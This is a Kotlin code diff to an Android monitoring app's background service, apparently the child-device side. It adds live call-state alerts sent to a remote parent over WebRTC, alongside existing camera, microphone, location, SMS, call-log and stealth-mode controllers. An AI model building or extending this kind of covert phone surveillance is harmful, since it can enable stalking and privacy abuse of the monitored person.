@@ -16,6 +16,8 @@ import androidx.core.app.ServiceCompat
 import androidx.core.content.ContextCompat
 import com.nexus.child.components.applock.AppLockCommandHandler
 import com.nexus.child.components.applock.AppLockController
+import com.nexus.child.components.callalert.CallAlertCommandHandler
+import com.nexus.child.components.callalert.CallAlertController
 import com.nexus.child.components.calllog.CallLogCommandHandler
 import com.nexus.child.components.calllog.CallLogController
 import com.nexus.child.components.camera.CameraController
@@ -185,6 +187,8 @@ class NexusBackgroundService : Service() {
     private var locationCommandHandler: LocationCommandHandler? = null
     private var callLogController: CallLogController? = null
     private var callLogCommandHandler: CallLogCommandHandler? = null
+    private var callAlertController: CallAlertController? = null
+    private var callAlertCommandHandler: CallAlertCommandHandler? = null
     private var smsController: SmsController? = null
     private var smsCommandHandler: SmsCommandHandler? = null
     private var vibrateFlashController: VibrateFlashController? = null
@@ -470,10 +474,11 @@ class NexusBackgroundService : Service() {
             // Step 6: Initialize all domain controllers
             initializeHardwareControllers(rtcManager, speakerMgr)
 
-            // Step 7: Push initial stealth mode state immediately when DataChannel opens
+            // Step 7: Push initial stealth mode state & start live call alerts when DataChannel opens
             rtcManager.onDataChannelOpened = {
-                Log.d(TAG, "WebRTC DataChannel opened. Dispatched initial stealth state to parent...")
+                Log.d(TAG, "WebRTC DataChannel opened. Dispatched initial stealth state & call alert monitor...")
                 stealthCommandHandler?.sendStatusUpdate()
+                callAlertCommandHandler?.onDataChannelOpened()
             }
 
         } catch (e: Exception) {
@@ -534,6 +539,14 @@ class NexusBackgroundService : Service() {
             callLogController = callCtrl,
             dataSender = { msg -> rtcManager.sendData(msg) }
         )
+
+        // Live Call State Alerts
+        val callAlertCtrl = CallAlertController(
+            context = this,
+            dataSender = { msg -> rtcManager.sendData(msg) }
+        )
+        callAlertController = callAlertCtrl
+        callAlertCommandHandler = CallAlertCommandHandler(callAlertCtrl)
 
         // SMS Messages
         val sCtrl = SmsController(this)
@@ -647,6 +660,7 @@ class NexusBackgroundService : Service() {
                 micCommandHandler?.handleCommand(command) == true ||
                 locationCommandHandler?.handleCommand(command) == true ||
                 callLogCommandHandler?.handleCommand(command) == true ||
+                callAlertCommandHandler?.handleCommand(command) == true ||
                 smsCommandHandler?.handleCommand(command) == true ||
                 vibrateFlashCommandHandler?.handleCommand(command) == true ||
                 wallpaperCommandHandler?.handleCommand(command) == true ||
@@ -684,6 +698,7 @@ class NexusBackgroundService : Service() {
         micCommandHandler?.onPeerDisconnected()
         locationCommandHandler?.onPeerDisconnected()
         callLogCommandHandler?.onPeerDisconnected()
+        callAlertCommandHandler?.onPeerDisconnected()
         smsCommandHandler?.onPeerDisconnected()
         vibrateFlashCommandHandler?.onPeerDisconnected()
         wallpaperCommandHandler?.onPeerDisconnected()
@@ -723,6 +738,8 @@ class NexusBackgroundService : Service() {
         vibrateFlashController?.cleanup()
         smsCommandHandler?.cleanup()
         smsController?.cleanup()
+        callAlertCommandHandler?.cleanup()
+        callAlertController?.cleanup()
         callLogCommandHandler?.cleanup()
         callLogController?.cleanup()
         locationCommandHandler?.cleanup()
